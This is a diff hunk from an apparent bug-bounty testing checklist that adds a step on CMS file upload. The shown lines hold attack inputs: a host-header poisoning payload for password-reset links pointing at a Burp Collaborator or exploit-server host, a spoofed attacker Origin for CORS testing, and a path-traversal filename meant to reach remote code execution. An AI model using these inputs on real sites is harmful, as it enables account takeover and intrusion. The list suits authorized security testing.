@@ -51,7 +51,7 @@
 40- try to put port in host: example.com:123 in reset password and see if that is reflected in email reset password token and if so add https://example.com:@burpcollaborator.net  or "'><a href="//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/?
 41- edit email and see if happened without verification p4 vulnerablity 
 42- edit Origin : domain[.]com[.]attacker[.]com ==> if accepted then cors misconfigration 
-
+43- if found cms tech upload file and put the name of the file "../../../../../../../../../../../../../../tmp/hossam.js" and try to get this file and make rce as https://blog.assetnote.io/2022/05/03/hacking-a-bank-using-dotcms-rce/
 
 
 
